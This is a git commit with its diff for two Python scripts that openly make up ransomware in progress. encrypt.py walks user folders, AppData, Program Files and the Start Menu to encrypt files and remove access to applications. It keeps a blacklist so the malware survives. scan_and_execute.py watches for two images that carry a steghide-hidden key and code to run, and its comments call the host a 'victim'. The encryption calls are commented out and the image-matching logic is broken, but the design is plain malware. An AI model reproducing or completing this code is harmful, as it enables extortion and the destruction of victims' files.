ec93965f6714fec4f70b0d17abd21917cc719a79
tyreseGill <168314093+tyreseGill@users.noreply.github.com>
2024-10-28 22:40:55 -0700

    Scans for Specific Files AND Encrypts Select Directories
    scan_and_execute.py can now scan for the two images from which the secret texts will be extracted from; now needs to be able to actually run steghide to extract from the aforementioned images and execute encrypt.py. Speaking of which, encrypt.py is more refined now, being able to encrypt specific directories relevant to the functionality of applications; now.

--- encrypt.py
+++ encrypt.py
@@ -1,5 +1,5 @@
 import os
-import subprocess #use to run steghide
+import subprocess # use to run steghide
 from cryptography.fernet import Fernet
 
 def encrypt_file(filename, key):
@@ -12,11 +12,43 @@ def encrypt_file(filename, key):
         encrypted_file.write(ciphertext)
 
 def main():
-    file_name = "Text.txt"
-    print("Does path exist?:", os.path.exists(file_name))
-    print("If so, where?:", os.path.abspath(file_name))
+    # TODO: Key should be fetched from an image!
     key = Fernet.generate_key()
-    encrypt_file("Text.txt", key)
+
+    # Represents the files that we absolutely do not want to encrypt in order
+    # to avoid deleting the malware or trashing the system beyond repair
+    blacklist = ["encrypt.exe", "scan_and_execute.py", "sys32.exe"]
+
+    # Selectively encrypts and removes user access to applications in given directories
+    host_username = os.getlogin()
+    directories_to_find_user_apps = [os.path.expanduser("~/Desktop"),
+                                     f"C://Users/{host_username}/AppData/Local",
+                                     f"C://Users/{host_username}/AppData/Roaming"]
+    for directory in directories_to_find_user_apps:
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file not in blacklist:
+                    name, extension = os.path.splitext(f'{dirs}/{file}')
+                    if extension in [".exe"]:
+                        pass
+                        #encrypt_file("Text.txt", key)
+                print(file)
+
+    # Encrypts directories in their entirety
+    directories_to_encrypt = [os.path.expanduser("~/Downloads"),
+                              os.path.expanduser("~/Documents"),
+                              os.path.expanduser("~/Pictures"),
+                              "C://Program Files/Common Files",
+                              "C://Program Files (x86)/Common Files",
+                              f"C://%programdata%/Microsoft/Windows/Start Menu/Programs"]
+    for directory in directories_to_encrypt:
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file not in blacklist:
+                    pass
+                    #encrypt_file("Text.txt", key)
+                print(file)
+
     print("Encryption successful!")
 
 main()
--- scan_and_execute.py
+++ scan_and_execute.py
@@ -1,14 +1,65 @@
 import os
 import subprocess #use to run steghide
-from cryptograph.fernety import Fernet
+from cryptography.fernet import Fernet
 
-def extract_message(image_path: string, password: string):
+def extract_message(image_path: str, password: str):
+    """Executes commandlines on powershell to run steghide and obtain in order
+    to obtain the "secret" message embedded within a given image.
+
+    :param image_path: The location on the computer where the image to be
+        examined is located
+    :param password: The key used to decrypt and access the "secret" message
+        in the image
+    :return: A string representing the secret text from the image
+    """
     pass
 
 def main():
     bool: readyToAttack = False  # Identifies if upon execution, the computer being run from is a victim
-    # Runs and continuously scans for the two pngs
-    while readyToAttack is False:
-        readyToAttack = os.path.exists("key.png") and os.path.exists("code.png")
-    if readyToAttack:
+
+    # Represents the two images to be scanned for in the downloads directory
+    imageContainingKey = "image1.png"
+    imageContainingCode = "image2.png"
+
+    # Represents whether the two images were found or not
+    keyFound = False
+    codeFound = False
+
+    # Scans the Downloads folder to look for the images and applications needed
+    # for the malware to remain operational
+    whitelist = [imageContainingKey, imageContainingCode]
+    downloads_directory = os.path.expanduser("~/Downloads")
+    for root, dirs, files in os.walk(downloads_directory):
+        for file in files:
+            if file in ["encrypt.exe", "scan_and_execute.py"]:
+                if file == imageContainingKey:
+                    keyFound = True
+                if file == imageContainingCode:
+                    codeFound = True
+            print(file)
+
+    ready_to_attack = keyFound and codeFound
+
+    # Have to keep looking for them at all times until both are found
+    while not ready_to_attack:
+        # Checks to see if the images are in Downloads or if user moved them to
+        # another directory
+        directories_to_be_searched = [downloads_directory,
+                                      os.path.expanduser("~/Pictures"),
+                                      os.path.expanduser("~/Documents")]
+        for directory in directories_to_be_searched:
+            for root, dirs, files in os.walk(directory):
+                for file in files:
+                    if file in ["encrypt.exe", "scan_and_execute.py"]:
+                        if file == imageContainingKey:
+                            keyFound = True
+                        if file == imageContainingCode:
+                            codeFound = True
+                        ready_to_attack = keyFound and codeFound
+                    print(file)
+
+    # TODO: Should execute steghide to extract the key and code to be executed
+    if ready_to_attack:
         pass
+
+main()
